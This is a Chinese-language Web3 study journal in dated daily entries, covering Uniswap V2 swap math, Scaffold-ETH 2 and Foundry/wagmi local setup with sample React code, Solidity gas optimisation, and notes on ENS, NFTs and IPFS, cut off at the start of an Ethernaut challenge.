\### 1. 核心公式：恒定乘积 (The Constant Product)

在传统金融（TradFi）中，价格是由人（买单和卖单）决定的。在 Uniswap V2 中，价格是由状态余额决定的。

公式：

$$x \\cdot y = k$$

\- $x$: 资金池中 Token A 的余额 (reserve0)

\- $y$: 资金池中 Token B 的余额 (reserve1)

\- $k$: 恒定常数 (Invariant)，也是流动性。在交易过程中（不考虑手续费时），$k$ 必须保持不变。

**无手续费的理想状态：** 根据恒定乘积公式 x⋅y=k，如果不考虑手续费，输出量 dy 的计算公式为：

$$

dy = \\frac{y \\cdot dx }{x + dx }

$$

有手续费

!\[\[图库/b1e9ee16713b81c63742f95404da1aa3\_MD5.jpg\]\]

\> 🤖 架构师类比：

\> 把 Uniswap 想象成一个\*\*“死脑筋的自动售货机”。它不管外面世界 ETH 卖多少钱，它只死守一条规矩：“有人拿走 Token A，就必须放入足够多的 Token B，保证我肚子里的 $A \\times B$ 总量不变。”\*\*

\---

\### 2. 代码锚点`swap()` 的数学推演

这是你作为审计员必须烂熟于心的逻辑。我们来看当用户进行一笔交易时，数值是如何流动的。

假设：

\- 用户\*\*输入\*\* $\\Delta x$ 个 Token A。

\- 用户\*\*获得\*\* $\\Delta y$ 个 Token B。

\- 手续费为 $0.3\\%$ (这意味着只有 $99.7\\%$ 的 $\\Delta x$ 真正进入了池子参与计算)。

**推演步骤：**

1\. **交易前状态：** $x \\cdot y = k$

2\. 交易后状态： 池子里多了 $\\Delta x$ (扣费后)，少了 $\\Delta y$。为了保持 $k$ 不变：

$$(x + \\Delta x\_{with\\\_fee}) \\cdot (y - \\Delta y) = k$$

3\. 求解 $\\Delta y$ (用户能拿走多少钱)：

$$\\Delta y = y - \\frac{k}{x + \\Delta x\_{with\\\_fee}}$$

代入 $k=x \\cdot y$，简化后得到 Web3 开发者最眼熟的公式：

$$\\Delta y = \\frac{y \\cdot \\Delta x\_{with\\\_fee}}{x + \\Delta x\_{with\\\_fee}}$$

\> ⚠️ 安全警示 (Integer Arithmetic)：

\> 在 Solidity 中没有小数。上述除法如果除不尽，会向下取整。

\>

\> Uniswap 的铁律： 所有的取整误差都必须有利于协议（LPs），而不利于交易者。这意味着用户总是少拿哪怕 1 wei 的 Token。如果代码逻辑导致向上取整，可能被攻击者利用“粉尘攻击”逐渐掏空池子。
<!-- DAILY_CHECKIN_2026-01-28_END -->

# 2026-01-27
<!-- DAILY_CHECKIN_2026-01-27_START -->







\# Scaffold-ETH 2

Scaffold-ETH 2 (SE-2) 是目前以太坊生态中最主流、最高效的\*\*全栈开发脚手架（Boilerplate）\*\*。

对于开发者，尤其是刚入门 Web3 的工程师，它解决了最大的痛点：\*\*如何在本地快速搭建一套包含“前端 UI + 智能合约 + 本地测试链 + 钱包连接”的完整环境。\*\*

\---

\### 1. 核心架构：由什么组成？

SE-2 并不是单一的工具，而是一套经过严选的技术栈组合。它将前后端打通，让你只需关注业务逻辑。

| 组件层级 | 技术选型 | 作用 |

| --- | --- | --- |

| \*\*前端框架\*\* | \*\*Next.js\*\* (React) + TypeScript | 构建用户界面，处理页面逻辑。 |

| \*\*合约框架\*\* | \*\*Foundry\*\* 或 \*\*Hardhat\*\* | 编写、编译、部署、测试智能合约。 |

| \*\*交互库\*\* | \*\*Wagmi\*\* + \*\*Viem\*\* | React Hooks 集合，负责前端与区块链通信（读写合约）。 |

| \*\*钱包组件\*\* | \*\*RainbowKit\*\* | 处理钱包连接（MetaMask, WalletConnect 等）的 UI 和逻辑。 |

| \*\*样式\*\* | \*\*Tailwind CSS\*\* | 快速构建现代化的前端样式。 |

\### 2. 核心功能：为什么它是“神器”？

对于初学者，SE-2 提供了三个极具价值的功能，能够大幅缩短“编写代码”到“看到效果”的反馈周期。

\#### A. 燃烧钱包 (Burner Wallet)

\* \*\*痛点\*\*：每次本地测试都要在 MetaMask 里切换网络、导入私钥、点击确认，非常繁琐。

\* \*\*SE-2 方案\*\*：它会在浏览器本地自动生成一个“一次性钱包”并预充值。你刷新页面，钱包就自动连上了。这使得开发调试极其流畅，无需手动签名确认每一笔交易。

\#### B. 调试合约页面 (Debug Contracts Page)

\* \*\*痛点\*\*：写完 Solidity 合约后，通常需要写脚本或做前端 UI 才能测试函数。

\* \*\*SE-2 方案\*\*：它会根据你的合约 ABI \*\*自动生成图形化 UI\*\*。

\* 读取函数（Read）：直接显示当前值。

\* 写入函数（Write）：提供输入框和按钮，点击即可发起交易。

\* \*\*价值\*\*：这是 SE-2 的杀手级功能。你只需修改 Solidity 代码，前端调试页面会自动更新，让你立即验证逻辑。

\#### C. 更加紧密的反馈循环

\* 在 `packages/hardhat` (或 foundry) 中修改合约 -> `yarn deploy` -> 前端自动感知合约地址和 ABI 的变化 -> 页面 UI 更新。

\### 3. 如何上手 (Quick Start)

作为工程师，直接看命令是最快的理解方式。确保本地已安装 Node.js (v18+) 和 Yarn。

1\. \*\*初始化项目\*\*

\`\`\`bash

npx create-eth@latest 项目名

\`\`\`

2\. \*\*启动本地链 (Terminal 1)\*\*

启动一个本地的以太坊节点（类似 Ganache，但更轻量）。

\`\`\`bash

yarn chain

\`\`\`

3\. \*\*部署合约 (Terminal 2)\*\*

将 `YourContract.sol` 部署到本地链。

\`\`\`bash

yarn deploy

\`\`\`

4\. \*\*启动前端 (Terminal 3)\*\*

启动 Next.js 前端，访问 `http://localhost:3000`[。](http://localhost:3000`。)

\`\`\`bash

yarn start

\`\`\`

\# Foundry + create-wagmi

这是一个 \*\*“分离式全栈开发标准作业程序 (SOP)”\*\*。

\### 第一步：目录结构规划 (WSL 磁盘救星)

不要把它们混在一起，建立两个独立的文件夹。

Bash

\`\`\`

mkdir ~/web3\_project

cd ~/web3\_project

\# 1. 后端（合约）

mkdir contracts

\# 2. 前端（UI）

mkdir frontend

\`\`\`

\---

\### 第二步：后端 (Foundry) - 极速部署

我们需要一个合约，并拿到 \*\*ABI\*\* 和 \*\*地址\*\*。

\*\*1. 初始化与启动本地链\*\*

Bash

\`\`\`

cd ~/web3\_project/contracts

forge init --no-git

\# 启动本地测试链 (新开一个终端保持运行)

anvil

\`\`\`

\*\*2. 写一个最简单的测试合约\*\*

修改 `src/Counter.sol` (或者你自己的审计合约)：

Solidity

\`\`\`

// src/Counter.sol

contract Counter {

uint256 public number;

function setNumber(uint256 newNumber) public { number = newNumber; }

function increment() public { number++; }

}

\`\`\`

\*\*3. 部署并获取关键信息\*\*

在 `contracts` 目录下执行：

Bash

\`\`\`

\# 部署到本地 Anvil 链 (默认端口 8545)

\# 私钥用的是 Anvil 默认的第一个测试账户

forge create src/Counter.sol:Counter \\

\--rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) \\

\--private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

\`\`\`

🚨 \*\*记录下终端输出的 `Deployed to: 0x...` 地址！\*\*

\*\*4. 导出 ABI\*\*

Foundry 编译后的 ABI 在 `out/Counter.sol/Counter.json` 里。你需要把这个 JSON 里的 `abi` 部分复制出来。

\---

\### 第三步：前端 (create-wagmi) - 极速搭建

\*\*1. 初始化\*\*

Bash

\`\`\`

cd ~/web3\_project/frontend

npm create wagmi@latest

\# 交互选择：React -> Vite -> Injected (或者 RainbowKit) -> TypeScript

npm install

\`\`\`

\*\*2. 配置链 (wagmi.config.ts 或 App.tsx)\*\*

打开 `src/wagmi.ts` (或 `config.ts`)，确保包含了 `foundry` 链（对应本地 Anvil）。

TypeScript

\`\`\`

import { http, createConfig } from 'wagmi'

import { foundry } from 'wagmi/chains' // <--- 关键：导入 foundry 链

import { injected } from 'wagmi/connectors'

export const config = createConfig({

chains: \[foundry\], // <--- 确保这里有 foundry

connectors: \[injected()\],

transports: {

\[[foundry.id](http://foundry.id)\]: http(),

},

})

\`\`\`

\---

\### 第四步：万能交互模板 (核心代码)

这是你要的“方案”。我在 `src` 下新建一个组件 `ContractDemo.tsx`。

这个组件封装了\*\*读取\*\*和\*\*写入\*\*的最简逻辑。你只需要把你的 `ABI` 和 `ADDRESS` 填进去。

TypeScript

\`\`\`

import { useReadContract, useWriteContract, useWaitForTransactionReceipt } from 'wagmi'

import { useState } from 'react'

// 1. 在这里填入你刚才部署的合约地址

const CONTRACT\_ADDRESS = '0x5FbDB2315678afecb367f032d93F642f64180aa3'

// 2. 在这里粘贴你的 ABI (从 foundry out 文件夹里复制)

const CONTRACT\_ABI = \[

{ "type": "function", "name": "number", "inputs": \[\], "outputs": \[{ "name": "", "type": "uint256", "internalType": "uint256" }\], "stateMutability": "view" },

{ "type": "function", "name": "increment", "inputs": \[\], "outputs": \[\], "stateMutability": "nonpayable" },

{ "type": "function", "name": "setNumber", "inputs": \[{ "name": "newNumber", "type": "uint256", "internalType": "uint256" }\], "outputs": \[\], "stateMutability": "nonpayable" }

\] as const;

export function ContractDemo() {

const \[value, setValue\] = useState('')

const { data: hash, writeContract, isPending } = useWriteContract()

// A. 读取数据 (Read)

const { data: currentNumber, refetch } = useReadContract({

address: CONTRACT\_ADDRESS,

abi: CONTRACT\_ABI,

functionName: 'number',

})

// B. 等待交易确认 (Wait for Tx)

const { isLoading: isConfirming, isSuccess: isConfirmed } =

useWaitForTransactionReceipt({ hash })

// C. 写入操作 (Write)

const handleSetNumber = async () => {

writeContract({

address: CONTRACT\_ADDRESS,

abi: CONTRACT\_ABI,

functionName: 'setNumber',

args: \[BigInt(value)\], // 注意：Wagmi 处理数字通常需要 BigInt

})

}

return (

<div style={{ padding: '20px', border: '1px solid #333', borderRadius: '8px', maxWidth: '400px' }}>

<h2>Foundry + Wagmi 控制台</h2>

{/\* 显示读取的数据 \*/}

<div style={{ marginBottom: '20px' }}>

<strong>链上当前值: </strong>

<span style={{ fontSize: '24px', color: '#61dafbaa' }}>

{currentNumber?.toString() ?? '加载中...'}

</span>

<button onClick={() => refetch()} style={{ marginLeft: '10px' }}>刷新</button>

</div>

{/\* 写入操作区域 \*/}

<div style={{ display: 'flex', gap: '10px', flexDirection: 'column' }}>

<input

type="number"

placeholder="输入新数字"

value={value}

onChange={(e) => setValue([e.target](http://e.target).value)}

style={{ padding: '8px' }}

/>

<button

disabled={isPending || isConfirming}

onClick={handleSetNumber}

\>

{isPending ? '请在钱包签名...' : isConfirming ? '交易确认中...' : '写入数据 (Set Number)'}

</button>

{/\* 交易状态反馈 \*/}

{hash && <div style={{ fontSize: '12px', wordBreak: 'break-all' }}>Tx Hash: {hash}</div>}

{isConfirmed && <div style={{ color: 'green' }}>✅ 交易成功！</div>}

</div>

</div>

)

}

\`\`\`

\*\*最后一步\*\*：在 `App.tsx` 里引入这个组件即可。

TypeScript

\`\`\`

import { ContractDemo } from './ContractDemo'

// ... inside App return ...

<ContractDemo />

\`\`\`

\---

\### 这套方案对安全审计的价值

1\. \*\*透明性\*\*`useWriteContract` 让你清楚地看到前端是如何构造 Transaction Data 的。如果你想测试前端注入攻击，你可以直接修改 `args` 参数。

2\. \*\*轻量级\*\*：整个前端只有 200MB，你可以随时 zip 打包发给别人，或者传到 Vercel。

3\. \*\*零魔法\*\*：相比 Scaffold-ETH 2 的自动挂钩，这里每一步（地址、ABI、调用）都是你手动控制的，非常适合理解底层交互。

\# 我的合约

messageboard:[https://sepolia.etherscan.io/address/0x6C1C45D9D0f7dd2697869254cF5259512cdC6b5C#code](https://sepolia.etherscan.io/address/0x6C1C45D9D0f7dd2697869254cF5259512cdC6b5C#code)
<!-- DAILY_CHECKIN_2026-01-27_END -->

# 2026-01-25
<!-- DAILY_CHECKIN_2026-01-25_START -->








# 智能合约 Gas 优化

## 核心原则

1.  **减少昂贵的存储写入**：SSTORE（写存储）是 Gas 消耗大户，原则是“读多写少”。
    
2.  **善用临时空间**：多用 `calldata` 和 `memory` 进行临时计算，减少对 `storage` 的依赖。
    
3.  **链下计算，链上验证**：复杂的遍历、统计、排序放到链下，链上只验证结果。
    
4.  **量化优化结果**：使用工具（如 Hardhat Gas Reporter、Foundry）量化每一次改动的 Gas 影响。
    

* * *

## 1\. 存储（Storage）优化：最贵的一环

### 减少 SSTORE 次数（先算后写）

-   **反模式**：在循环或函数中多次写入状态变量。
    
-   **优化**：在 `memory`（内存）或栈中完成计算，最后一次性写入 `storage`。
    

```
// ❌ 差写法：多次 SSTORE，费钱
function bad(uint256 x) external {
    total += x;         // 写一次
    total += 1;         // 再写一次
}

// ✅ 推荐写法：只写一次
function good(uint256 x) external {
    uint256 newTotal = total + x + 1; // 在 memory/stack 算完
    total = newTotal;                 // 单次 SSTORE，省钱
}
```

### 变量打包（Storage Packing）

-   **原理**：将多个小变量（如 `uint128`, `uint64`, `bool`）紧挨着声明，Solidity 会尝试将它们打包进同一个 32 字节的 Slot 中。
    
-   **注意**：只有在同一个 Slot 被多个变量共享时才有意义；在 `memory` 或 `stack` 中使用小整数并不会更省 Gas。
    

### 用事件（Events）替代存储

-   **场景**：对于只用于查历史记录、不参与合约逻辑计算的数据（如充值记录、操作日志）。
    
-   **做法**：将数据发出 Event 而不是写入 Storage，成本大幅降低。
    

* * *

## 2\. 数据位置与类型策略

### 优先使用 Calldata

-   **外部函数参数**：对于外部函数（external）的只读参数（数组、字符串、bytes），优先使用 `calldata`。它不会像 `memory` 那样复制数据，成本更低。
    

### 缓存 Storage 到 Memory

-   **场景**：在函数生命周期内需要多次读取同一个状态变量（特别是结构体或循环中）。
    
-   **做法**：先将状态变量赋值给一个 `memory` 变量（副本），后续逻辑读取副本，必要时最后写回。
    

### 常量优化（Constant & Immutable）

-   **Constant**：编译期确定的值，直接写入字节码，不占 Storage Slot。
    
-   **Immutable**：部署时（构造函数中）确定一次，之后只读。适合配置地址、治理角色等，比读取 Storage 便宜。
    

* * *

## 3\. 逻辑与控制流微优化

### Unchecked 代码块

-   **背景**：Solidity ≥0.8 默认开启溢出检查。
    
-   **优化**：如果能确保数学运算（如循环计数器 `i++`）绝对不会溢出，使用 `unchecked { ... }` 包裹可节省 Gas。
    

### 短路逻辑（Short-circuiting）

-   **做法**：在 `if (cheap && expensive)` 中，将计算便宜的判断放在前面。如果前一个条件失败，后续昂贵的判断将不会执行。
    

### 位运算代替 Bool 组

-   **做法**：使用位掩码（bitmask）在一个 `uint256` 中存储一组布尔标志，配合位运算（`&`, `|`），比多个独立的 bool slot 更省 Gas。
    

* * *

## 4\. 架构级优化

### 瞬态存储（Transient Storage, EIP-1153）

-   **定义**：Dencun 升级引入的 `TSTORE`/`TLOAD`，数据只在单笔交易内有效，交易结束即丢弃。
    
-   **场景**：重入锁（Reentrancy Guard）、单笔交易内的临时计算。比写入永久 Storage 便宜得多。
    

### 链下计算 + 链上验证

-   **避免**：不要在链上进行不受控制长度的循环（如遍历所有用户发空投）。
    
-   **替代**：使用 Merkle Tree（默克尔树）或签名证明。链下生成数据和证明，链上只验证 Proof，避免大循环。
    

### 模块化与代理

-   **Minimal Proxy (EIP-1167)**：对于需要部署多个相同逻辑合约（如 Vaults）的场景，使用克隆模式，大幅降低部署 Gas。
    

* * *

## 5\. 扩容视角

-   **移至 L2**：能搬到 Layer 2（Rollup）的逻辑尽量迁移。随着 Dencun 升级（Blob 交易），L2 的成本已大幅下降，这是最直接的省钱方式。
    

## ✅ 优化 Checklist

1.  **能不写 Storage 就不写**，能合并写就合并写。
    
2.  **External 参数**优先用 `calldata`。
    
3.  **循环中**不要重复读写 Storage，先缓存到 Memory。
    
4.  **死变量**用 `constant`/`immutable`。
    
5.  **循环计数**在安全前提下用 `unchecked`。
    
6.  **大批量处理**改用 Merkle Proof 或分页处理。
<!-- DAILY_CHECKIN_2026-01-25_END -->

# 2026-01-24
<!-- DAILY_CHECKIN_2026-01-24_START -->









\# 📝 ENS (Ethereum Name Service) 核心概念笔记

\### 1. 什么是 ENS？

ENS（以太坊域名服务）类似于互联网中的 **DNS（域名系统）**。

\- **核心功能**：它将冗长、难以记忆的以太坊地址（如 `0xae9459...`）映射为人类可读的名称（如 `sanfordstout.eth`）,。

\- **类比**：就像我们访问网站时输入 `google.com` 而不是 IP 地址 `142.250.190.46` 一样，ENS 让用户可以通过简单的名称来发送交易或识别身份，而不必复制粘贴复杂的哈希地址,。

\### 2. ENS 的本质与特性

\- **它是 NFT (ERC-721)**：

\- 注册的 ENS 域名本质上是一个 **NFT**（非同质化代币），遵循 ERC-721 标准,,。

\- **所有权即控制权**：拥有该 NFT 的钱包地址即拥有该域名的控制权。如果你将 ENS NFT 发送给别人，接收者将获得该域名的所有权并能控制其解析指向,。

\- **唯一性**：每个 ENS 域名都有一个唯一的 Token ID。

\- **Web3 的跨平台身份**：

\- ENS 不仅仅是地址的别名，它代表了你在 Web3 世界的 **通用身份**。

\- **身份随行**：当你登录不同的去中心化应用（如 OpenSea, Uniswap, Zapper）时，这些应用会自动识别并显示你的 ENS 名称，而不是冷冰冰的地址。你的身份、声誉和库存（Inventory）会跟随你的域名在不同服务间流转,,。

\### 3. 注册机制 (Commit-Reveal 模式)

为了防止恶意抢注（Front-running），ENS 的注册过程设计了独特的 **"Commit-Reveal"（提交-揭示）** 机制，需要两笔交易,：

1\. **Commit (提交)**：

\- 用户首先向智能合约发送一个“提交”交易。这笔交易包含你想要注册的名字的哈希值（即承诺），但不会公开具体名字,。

\- **目的**：防止有人在内存池（Mempool）中看到你想注册的名字后，通过提高 Gas 费来抢先打包交易从而窃取该域名。

2\. **等待期**：

\- 提交后需要等待大约 **1分钟**。这是一种防止恶意干扰的博弈机制,。

3\. **Reveal (揭示/注册)**：

\- 等待期结束后，发送第二笔交易“揭示”名字并正式注册。这笔交易会生成 NFT 并完成注册流程,。

\### 4. 反向解析 (Reverse Record)

\- **定义**：正向解析是“名字 -> 地址”，而反向解析是“地址 -> 名字”。

\- **作用**：当你连接钱包到 DApp 时，应用只知道你的 `0x...` 地址。为了让应用显示你的 ENS 名称（例如在右上角显示 `sanfordstout.eth`），你必须设置反向记录。

\- **操作**：这需要从该地址发起一笔单独的交易，声明“这个地址对应的主要名称是这个 ENS”。只有地址的拥有者才能设置其反向记录，这保证了身份的真实性。

\### 5. 高级功能与应用

\- **子域名 (Subdomains)**：

\- 拥有一个主域名后，你可以创建子域名（例如 `game.eda.eth` 或 `punk.austingriffith.eth`）。这类似于传统的 DNS 子域名结构。

\- 这对于组织或多钱包管理非常有用（例如用子域名区分不同的钱包用途）。

\- **简化转账体验**：

\- 用户在转账时只需输入对方的 ENS 名称，钱包会自动解析出对应的以太坊地址，极大地降低了转错账的风险并提升了用户体验。

\### 6. 局限性与注意事项

\- **女巫攻击 (Sybil Resistance)**：虽然有数十万个 ENS 持有者，但这并不代表有数十万个真实人类用户。一个人可以创建无数个地址并注册无数个 ENS，因此 ENS 数量不等于用户数量,。

\- **审查与索引**：虽然 ENS 是去中心化的标准，但部分 Web2 或 Web3 平台（如某些 NFT 市场）可能因为索引问题或主观选择，不一定能完美支持或显示 ENS 名称,。

\# 📝 NFT (Non-Fungible Token) 学习笔记

、

!\[\[图库/0ceb1a2c50270c37a85b60ef9426cc94\_MD5.jpg\]\]

\### 1. 本质与定义：ERC-20 vs. ERC-721

NFT 代表非同质化代币，理解它的最好方式是与同质化代币（Fungible Token）进行对比：

\- **同质化代币 (ERC-20)**：类似于货币、黄金或石油。

\- **记录方式**：智能合约通过一个巨大的数组来追踪\*\*余额（Balance）\*\*。

\- **特性**：所有的代币都是一样的。如果我有 100 个币，转给你 50 个，剩下的 50 个与转走的 50 个没有任何区别，它们混在一起。

\- **非同质化代币 (ERC-721)**：类似于棒球卡或独特的收藏品。

\- **记录方式**：智能合约追踪的是\*\*“谁拥有哪一个特定的 ID”\*\*。例如，合约记录“Token #1 属于 Alice”。

\- **特性**：每个代币都有唯一的元数据（Metadata）和属性，无法互换。

\### 2. 核心特性 (Key Characteristics)

\#### A. 链上来源与真实性 (On-Chain Provenance)

\- **数字所有权**：NFT 提供了数字资产的所有权证明。

\- **防伪**：艺术家铸造（Mint）一个系列后，所有人都能在链上看到该系列是由特定艺术家的合约创建的。即使有人复制了图片并重新铸造（“Knockoff”），市场和区块链也能轻易识别出它并非来自原始合约，因此没有价值。

\- **数字稀缺性 (Digital Scarcity)**：艺术家在合约中设定供应上限（如 10,000 个 Punk）。一旦达到上限，代码层面保证了无法再增发，从而创造了稀缺性。

\#### B. 元数据与存储 (Metadata & Storage)

NFT 的核心是 **Token URI**，它指向描述该 NFT 的元数据（通常是一个 JSON 文件，包含名称、图像链接、属性等）。存储方式主要有两种：

1\. **IPFS (去中心化存储)**：

\- **内容寻址 (Content Addressable)**：IPFS 通过内容的哈希值来生成地址。如果图像或元数据发生任何变化（例如从 Buffalo 变成 Bison），其哈希地址也会改变。

\- **不可篡改性**：这保证了你购买的 NFT 元数据是不可变的。如果链接指向 IPFS，你可以确信内容不会被偷偷替换。

2\. **链上渲染 (On-Chain SVG)**：

\- 少数 NFT（如 Loogies）不依赖外部存储，而是直接将图像数据（SVG代码）和颜色逻辑写在智能合约里。

\- **特性**：虽然 Gas 费昂贵，但它是最持久的存在形式，只要以太坊存在，图像就存在。这也被视为一种技术上的“炫耀（Flex）”。

3\. **Web服务器 (风险提示)**：

\- 如果 NFT 指向的是中心化的 Web 服务器，控制者可以随时更换图片或关闭服务器（“Rug Pull”），导致你拥有的 NFT 变成空白或毫无价值的东西。

\#### C. 可组合性与效用 (Composability & Utility)

NFT 不仅仅是图片，它们可以拥有丰富的功能：

\- **属性 (Properties)**：NFT 可以包含稀有度不同的属性（如“圆顶”、“撕裂”等），这些属性可以被市场过滤和定价。

\- **门控与权限 (Token Gating)**：拥有特定的 NFT 可以作为进入聊天室、参与投票或参加现实世界会议的“门票”。

\- **游戏道具**：NFT 可以是游戏中的马、鸡或武器。由于所有权在链上，游戏开发者无法随意拿走你的道具，你甚至可以在不同的游戏或应用中使用同一个 NFT。

\### 3. 创作者经济 (Creator Economy)

\- **去中介化**：NFT 允许创作者直接与粉丝连接，无需经过 Spotify 或画廊等中间商，直接变现“超级粉丝”的支持。

\- **版税 (Royalties)**：创作者可以在智能合约中编写逻辑（如荷兰式拍卖或转账逻辑），确保在二级市场交易时，每一笔销售的一定比例（如 10%）自动发送给原艺术家。

\### 4. 跨平台身份 (Interoperability)

\- **身份随行**：你的 NFT 是你 Web3 身份和库存（Inventory）的一部分。无论你登录 OpenSea、Zapper 还是 Rarible，这些应用都会识别出你钱包中持有的 NFT。

\- **ENS 也是 NFT**：以太坊域名（ENS）本质上也是一个符合 ERC-721 标准的 NFT，它既是你的名字，也是可以交易的资产。

\---

\# 📝 IPFS (InterPlanetary File System) 综合学习笔记

\### 1. 什么是 IPFS？

IPFS 是一个\*\*点对点（Peer-to-Peer）\*\*的分布式文件存储网络。

\- **核心定义**：它不是区块链，而是一个\*\*存储层（Storage Layer）\*\*。

\- **网络结构**：数据不存储在单一的中心化服务器上，而是分布在网络中连接的用户计算机（节点）上。这利用了去中心化的激励机制，鼓励人们在网络中存储和共享信息。

\### 2. 核心机制：内容寻址 (Content Addressing)

这是 IPFS 最本质的特性，区别于 Web2 的“位置寻址”。

\- **位置 vs. 内容**：

\- **Web2 (HTTP)**：基于\*\*位置\*\*寻找文件（“数据在哪里？” 例如 `google.com/image.jpg`）。如果服务器关闭或文件被替换，链接就会失效或指向错误内容,。

\- **Web3 (IPFS)**：基于\*\*内容\*\*寻找文件（“数据是什么？”）。系统根据文件内容生成唯一的\*\*哈希值（Hash）\*\*作为地址。

\- **哈希即地址**：

\- **唯一性**：任何两个相同的文件都会生成完全相同的哈希（去重）。

\- **敏感性**：如果你修改了文件中的任何一点内容（例如将元数据中的 "Buffalo" 改为 "Bison"），哪怕只是一个字母，生成的哈希地址也会完全改变（例如从 `h91d` 变为 `xcxq`）。

\### 3. IPFS 与 区块链 (NFT) 的关系

为了形象理解两者的分工，我们可以使用\*\*“购物小票与仓库”\*\*的比喻：

\#### A. 形象比喻

\- **区块链 (智能合约) = 购物小票/所有权证书**,

\- **作用**：昂贵的、不可篡改的记账本。它记录\*\*“谁拥有什么”\*\*（例如：“Alice 拥有 Token #1”）。

\- **特点**：存储数据非常昂贵，只存最关键的“指针”或“收据”。

\- **IPFS = 去中心化仓库**

\- **作用**：便宜的、防篡改的存储柜。它保存\*\*“那个东西具体是什么”\*\*（图像文件、元数据 JSON）。

\- **特点**：通过“内容寻址”保证货物没被调包。如果有人修改了图片，哈希地址就变了，与区块链小票上的地址就不匹配了。

\#### B. 技术流程 (Token URI)

在 NFT 项目中，数据流通常如下,,：

1\. **智能合约**：存储 Token ID 和 `tokenURI` 函数。

2\. **tokenURI**：返回一个指向 IPFS 的哈希链接（如 `ipfs://Qm...`）。

3\. **元数据 (Metadata)**：该链接指向 IPFS 上的一份 JSON 文件，里面描述了 NFT 的名称、属性（Attributes）。

4\. **图像数据**：JSON 文件中包含另一个 IPFS 链接，指向实际的图片文件。

\### 4. 为什么 NFT 需要 IPFS？(防止 Rug Pull)

\- **Web2 服务器的风险**：如果 NFT 的元数据存储在中心化服务器上，管理员可以在后台悄悄替换图片，或者因为不想维护服务器而关闭它。这被称为 "Rug Pull"（卷地毯/跑路），导致你手里的 NFT 变成空白或毫无价值的东西,。

\- **IPFS 的不可篡改性 (Immutability)**：由于内容寻址的特性，只要合约指向特定的 IPFS 哈希，你就可以\*\*确信该链接指向的内容永远不会改变\*\*。这是 Web3 数字资产真实性的重要保障,。

\### 5. 局限性：Pinning (数据持久化)

虽然 IPFS 是去中心化的，但数据\*\*不会自动永久保存\*\*。

\- **存储原理**：数据实际上是存储在节点的硬盘上的。如果没有节点（人或服务器）愿意“托管”（Host）特定的数据，它可能会从网络中消失。

\- **Pinning 服务**：为了防止数据丢失，必须进行 **"Pinning"（固定）** 操作，即明确告诉节点“请永久保留这个文件”。

\- **解决方案**：开发者通常使用 **Pinata** 或 **Arweave** 等服务来确保 IPFS 内容被持久化存储。

\---

**总结**：IPFS 是 Web3 的硬盘。它通过\*\*内容寻址\*\*解决了信任问题（你确定你下载的就是你想要的），通过\*\*分布式存储\*\*解决了单点故障问题。它与作为“结算层”的区块链完美互补，共同构成了去中心化应用的基础设施。
<!-- DAILY_CHECKIN_2026-01-24_END -->

# 2026-01-23
<!-- DAILY_CHECKIN_2026-01-23_START -->










# 📝 ENS (Ethereum Name Service) 核心概念笔记

### 1\. 什么是 ENS？

ENS（以太坊域名服务）类似于互联网中的 **DNS（域名系统）**。

-   **核心功能**：它将冗长、难以记忆的以太坊地址（如 `0xae9459...`）映射为人类可读的名称（如 `sanfordstout.eth`）,。
    
-   **类比**：就像我们访问网站时输入 `google.com` 而不是 IP 地址 `142.250.190.46` 一样，ENS 让用户可以通过简单的名称来发送交易或识别身份，而不必复制粘贴复杂的哈希地址,。
    

### 2\. ENS 的本质与特性

-   **它是 NFT (ERC-721)**：
    
    -   注册的 ENS 域名本质上是一个 **NFT**（非同质化代币），遵循 ERC-721 标准,,。
        
    -   **所有权即控制权**：拥有该 NFT 的钱包地址即拥有该域名的控制权。如果你将 ENS NFT 发送给别人，接收者将获得该域名的所有权并能控制其解析指向,。
        
    -   **唯一性**：每个 ENS 域名都有一个唯一的 Token ID。
        
-   **Web3 的跨平台身份**：
    
    -   ENS 不仅仅是地址的别名，它代表了你在 Web3 世界的 **通用身份**。
        
    -   **身份随行**：当你登录不同的去中心化应用（如 OpenSea, Uniswap, Zapper）时，这些应用会自动识别并显示你的 ENS 名称，而不是冷冰冰的地址。你的身份、声誉和库存（Inventory）会跟随你的域名在不同服务间流转,,。
        

### 3\. 注册机制 (Commit-Reveal 模式)

为了防止恶意抢注（Front-running），ENS 的注册过程设计了独特的 **"Commit-Reveal"（提交-揭示）** 机制，需要两笔交易,：

1.  **Commit (提交)**：
    
    -   用户首先向智能合约发送一个“提交”交易。这笔交易包含你想要注册的名字的哈希值（即承诺），但不会公开具体名字,。
        
    -   **目的**：防止有人在内存池（Mempool）中看到你想注册的名字后，通过提高 Gas 费来抢先打包交易从而窃取该域名。
        
2.  **等待期**：
    
    -   提交后需要等待大约 **1分钟**。这是一种防止恶意干扰的博弈机制,。
        
3.  **Reveal (揭示/注册)**：
    
    -   等待期结束后，发送第二笔交易“揭示”名字并正式注册。这笔交易会生成 NFT 并完成注册流程,。
        

### 4\. 反向解析 (Reverse Record)

-   **定义**：正向解析是“名字 -> 地址”，而反向解析是“地址 -> 名字”。
    
-   **作用**：当你连接钱包到 DApp 时，应用只知道你的 `0x...` 地址。为了让应用显示你的 ENS 名称（例如在右上角显示 `sanfordstout.eth`），你必须设置反向记录。
    
-   **操作**：这需要从该地址发起一笔单独的交易，声明“这个地址对应的主要名称是这个 ENS”。只有地址的拥有者才能设置其反向记录，这保证了身份的真实性。
    

### 5\. 高级功能与应用

-   **子域名 (Subdomains)**：
    
    -   拥有一个主域名后，你可以创建子域名（例如 `game.eda.eth` 或 `punk.austingriffith.eth`）。这类似于传统的 DNS 子域名结构。
        
    -   这对于组织或多钱包管理非常有用（例如用子域名区分不同的钱包用途）。
        
-   **简化转账体验**：
    
    -   用户在转账时只需输入对方的 ENS 名称，钱包会自动解析出对应的以太坊地址，极大地降低了转错账的风险并提升了用户体验。
        

# 6\. 局限性与注意事项

-   **女巫攻击 (Sybil Resistance)**：虽然有数十万个 ENS 持有者，但这并不代表有数十万个真实人类用户。一个人可以创建无数个地址并注册无数个 ENS，因此 ENS 数量不等于用户数量,。
    
-   **审查与索引**：虽然 ENS 是去中心化的标准，但部分 Web2 或 Web3 平台（如某些 NFT 市场）可能因为索引问题或主观选择，不一定能完美支持或显示 ENS 名称,。
<!-- DAILY_CHECKIN_2026-01-23_END -->

# 2026-01-22
<!-- DAILY_CHECKIN_2026-01-22_START -->











以太航员  

\# fallout

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

